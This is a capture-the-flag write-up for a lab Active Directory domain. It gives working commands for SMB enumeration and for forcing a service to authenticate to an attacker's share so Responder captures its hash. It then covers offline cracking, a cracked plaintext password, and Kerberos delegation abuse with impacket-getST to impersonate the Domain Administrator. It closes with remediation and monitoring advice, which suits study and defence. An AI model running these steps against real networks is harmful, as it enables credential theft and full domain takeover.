**Difficulty:** Easy  
**Platform:** TryHackMe  
**Category:** Active Directory, Kerberos Delegation  
**Target:** 10.114.148.221 (CTF.LOCAL domain)

---
## Executive Summary

The Proxy room simulates a real-world Active Directory environment where a misconfigured service account holds the key to domain compromise. The chain begins with an anonymous SMB share containing onboarding documentation, pivots through a file scanner service vulnerable to credential coercion, escalates via cracked service account credentials, and finishes by abusing Kerberos Constrained Delegation with Protocol Transition to impersonate the Domain Administrator.

The room's name is the biggest clue. You do not break into the Administrator account. You act as a proxy to obtain a ticket as the Administrator.

---
## Business Impact

If this configuration existed in a production environment, an unauthenticated attacker with network access to the SMB share would be able to:

1. **Extract service account credentials** without ever touching a workstation. The file scanner service runs with domain credentials and connects to attacker-controlled shares automatically.

2. **Move laterally with legitimate credentials.** The cracked `svc.scanner` account is a valid domain user, so all activity blends into normal authentication logs.

3. **Impersonate the Domain Administrator** via Kerberos delegation, which means full control over the Domain Controller, all domain-joined systems, and every user account in the forest.

4. **Achieve domain persistence** by using the impersonated Administrator ticket to create Golden Tickets, add backdoor accounts, or deploy ransomware across the entire estate.


The critical control failures are:

- Anonymous SMB access to a share containing internal documentation

- A writable share processed by a privileged automated service

- A service account configured with Constrained Delegation and Protocol Transition, which should be reserved for rare, tightly scoped use cases

- Weak passwords on a domain service account

---
## Difficulties I Ran Into

This box is genuinely frustrating because it stacks several independent traps:

- **Decoy credentials.** The `IT-Credentials-Backup.txt` file lists two accounts (`helpdesk.bob`, `it.admin`) that are explicitly disabled. Easy to burn 20 minutes trying them.

- **The "icons" misdirection.** The onboarding checklist says the scanner "uses Shell enumeration to inspect file metadata and icons." That phrase sends almost everyone down the `.scf`, `.url`, `desktop.ini` coercion path. In this box, that path does nothing.

- **Silent port conflict.** If your Kali or AttackBox already has a service listening on port 445, Responder will never see the callback. This looks identical to "wrong payload type."

- **DNS resolution failure with bloodhound-python.** The tool bypasses `/etc/hosts` and needs a direct DNS server. The error message ("Could not find the requested domain") is misleading.

- **Domain typo.** A single misplaced letter (`ctf.loal` instead of `ctf.local`) returns an LDAP referral that looks like a permission issue, not a typo.

- **Impacket version mismatch.** The bundled `getST.py` imports a function that does not exist in Kali's packaged Impacket. The import error blocks the entire exploit.

- **Username spelling.** `svc-scanner` versus `svc.scanner`. Kerberos returns `KDC_ERR_C_PRINCIPAL_UNKNOWN` for the wrong one and it is not obvious which is correct.

- **Impacket smbclient is not Samba smbclient.** Commands like `shares` and `use` replace `ls` and `cd`. Easy to get stuck at a prompt with no share selected.


Each of these cost real time. Together they make the box feel unfair on a first pass, but every single one teaches a lesson you will use in real engagements.

---
## Walkthrough

### Step 1: Reconnaissance

I ran a full TCP port scan with service detection against the target.

```
nmap -sC -sV -p- 10.114.148.221 -oN nmap_full.txt
```

Key findings:

| Port   | Service       | Notes                                      |
| ------ | ------------- | ------------------------------------------ |
| 53     | DNS           | Simple DNS Plus                            |
| 88     | Kerberos      | Microsoft Windows Kerberos                 |
| 135    | MSRPC         | Windows RPC                                |
| 139    | NetBIOS       | Legacy SMB                                 |
| 389    | LDAP          | Active Directory LDAP, domain ctf.local    |
| 445    | SMB           | Microsoft DS, signing enabled and required |
| 464    | kpasswd5      | Kerberos password change                   |
| 593    | RPC over HTTP |                                            |
| 636    | LDAPS         | tcpwrapped                                 |
| 3268   | LDAP GC       | Global Catalog                             |
| 3269   | LDAPS GC      | tcpwrapped                                 |
| 3389   | RDP           | Microsoft Terminal Services                |
| 9389   | mc-nmf        | .NET Message Framing (AD Web Services)     |
| 49668+ | MSRPC         | Dynamic RPC endpoints                      |
The RDP service banner confirmed the target identity:

```
Target_Name: CTF
NetBIOS_Domain_Name: CTF
NetBIOS_Computer_Name: DC01
DNS_Domain_Name: ctf.local
DNS_Computer_Name: DC01.ctf.local
Product_Version: 10.0.17763
```

So the target is a Windows Server 2019 Domain Controller named DC01 in the ctf.local domain. This is not a general-purpose server. Every service listed above is a Tier 0 service, which means any credential compromise on this host has immediate domain-wide impact.

Note on RDP: port 3389 is open, but RDP is not the attack path here. The room's chain moves through SMB and Kerberos, not interactive logon. The open port is worth noting for completeness, but it does not change the approach.

Note on SMB signing: the scan reports `Message signing enabled and required`. This rules out NTLM relay attacks against SMB on this host. It does not rule out credential capture. The scanner service we are about to abuse authenticates outbound to an attacker-controlled share, so the hash we capture can still be cracked offline. Signing only matters for relay, not for capture-and-crack.

![[Nmap-1.png]]

![[Nmap-2.png]]

---
### Step 2: SMB Enumeration

I attempted an anonymous SMB session and found the IT-Shared share was both readable and writable.

```
smbclient -L //10.114.148.221 -N
```

![[smb.png]]

The share comment "IT Department Shared Resources" made it the obvious target. I connected and downloaded the three files inside.

![[IT-Shared.png]]

---
### Step 3: Reading the Intel

The credentials file looked promising at first:

![[IT-Credentials.png]]

Both accounts are explicitly marked disabled. This is a decoy. Trying them wastes time.

The onboarding checklist was the real prize:

![[IT-Onboarding.png]]

Three key facts:

- The account is `svc.scanner`

- It processes new files every 2 minutes

- It performs some kind of shell enumeration on files in the share

---
### Step 4: The Failed Coercion Attempts

The standard Windows coercion path uses file types that trigger Explorer to fetch an icon over the network. I tried each one with Responder listening on the tun0 interface.

```
sudo responder -I tun0 -v
```

I planted, one at a time, in IT-Shared:

- A `.url` file with `IconFile=\\10.x.x.x\share\icon.ico`

- A `desktop.ini` with `IconResource=\\10.x.x.x\share\icon.ico,0`

- A `.scf` file pointing at the same UNC path


Nothing. No callback. Three separate scan cycles passed. The "icons" wording in the checklist is scenery. It is a misdirection.

The actual vector is simpler. The scanner executes `.ps1` files it finds in the share. I wrote a one-liner:

```
Get-ChildItem \\[tun0-IP]\share\
```

Uploaded as `intercept.ps1` to IT-Shared. Within the two-minute window, Responder lit up with a NetNTLMv2 hash from `CTF\svc.scanner`.

Note on a common blocker: if your attacking machine already has smbd running on port 445, Responder will not receive the connection. Kill anything on that port before starting Responder. This took me a while to spot because the symptom looks identical to "wrong payload."

![[Responder-capture.png]]

---
### Step 5: Cracking the Hash

I saved the captured hash to `hash.txt` and used John the Ripper because hashcat failed on this VM with `CL_PLATFORM_NOT_FOUND_KHR` (no OpenCL runtime available).

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Result:

```
svc.scanner:1summerlove!
```

![[hash-cracking.png]]

---
### Step 6: Enumerating Delegation

With valid domain credentials in hand, I needed to find what the `svc.scanner` account could do. BloodHound's Python collector failed with DNS resolution errors. Instead I used Impacket's `findDelegation.py`, which talks straight to the DC's IP and avoids the resolver entirely.

```
python3 findDelegation.py 'ctf.local/svc.scanner:1summerlove!' -dc-ip 10.114.148.221
```

Output : 

```
AccountName   AccountType   DelegationType                    DelegationRightsTo
svc.scanner   Person        Constrained w/ Protocol Transition   cifs/DC01
svc.scanner   Person        Constrained w/ Protocol Transition cifs/DC01.ctf.local
```

There it is. The account has Constrained Delegation with Protocol Transition. This means the account can use S4U2Self to obtain a service ticket on behalf of any user without knowing their password, then S4U2Proxy to forward that ticket to the allowed service. The allowed service is `cifs` on the Domain Controller itself.

![[find-Delegation-Output.png]]

---
### Step 7: Requesting the Impersonation Ticket

Impacket's `getST.py` handles the S4U2Self and S4U2Proxy exchange. I used the system-installed wrapper because the version bundled with the challenge had an import error against the Kali Impacket library.

```
impacket-getST -spn cifs/DC01.ctf.local -impersonate Administrator 'ctf.local/svc.scanner:1summerlove!' -dc-ip 10.114.148.221
```

Output :

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

I now hold a Kerberos ticket that says I am the Administrator and that I am authorized to access CIFS on DC01.

![[getST-success.png]]

---
### Step 8: Using the Ticket

I pointed Kerberos at the ticket cache and connected to the DC's C$ share.

```
export KRB5CCNAME=$PWD/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
impacket-smbclient -k -no-pass DC01.ctf.local
```

Inside the Impacket smbclient prompt, I listed shares and entered C$:

```
# shares
# use C$
# cd Users\Administrator\Desktop
# ls
# get flag.txt
```

![[accessing-ticket.png]]

The flag file was sitting on the Administrator's desktop.

![[getting-flag.png]]

---
## Lessons Learned

1. Do not trust every hint. The "icons" wording was a deliberate red herring. In real environments, service behavior can differ from documentation.

2. Port conflicts silently break callback attacks. Always confirm nothing else is bound to the listening port before starting a coercion tool.

3. Kerberos delegation is a top-tier privilege escalation path. Accounts with Constrained Delegation and Protocol Transition should be treated as equivalent to Domain Admin if they can target a Tier 0 service.

4. Attackers use the tools that match the environment. When bloodhound-python fails on DNS, Impacket's `findDelegation.py` gets the same answer with less friction.

5. Small details matter. A misspelled domain name, a wrong username format, or an outdated Impacket script can each cost an hour. Always double-check inputs against captured evidence.

---
## Remediation

1. Remove anonymous and guest access from all SMB shares. The IT-Shared share should require authenticated access at minimum.

2. Audit every account with the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag. Remove the flag unless there is a documented business need.

3. Restrict `msDS-AllowedToDelegateTo` targets to non-Tier 0 services. Never allow delegation to CIFS, LDAP, or HTTP on a Domain Controller.

4. Rotate the `svc.scanner` password and enforce a long, random value. The cracked password was short and dictionary-based.

5. Monitor for S4U2Self and S4U2Proxy events (Event IDs 4768, 4769) and alert on ticket requests where the target service is a Domain Controller.

6. Disable or delete stale accounts like `helpdesk.bob` and `it.admin` promptly. Their presence in a readable share creates noise and weakens the security posture.

---
## Tools Used

- nmap (full TCP scan with service detection)

- smbclient (Samba) for anonymous SMB enumeration

- Responder for NetNTLMv2 capture

- John the Ripper for offline hash cracking

- hashcat (attempted, failed due to missing OpenCL on the VM)

- Impacket suite: `findDelegation.py`, `getST.py`, `smbclient`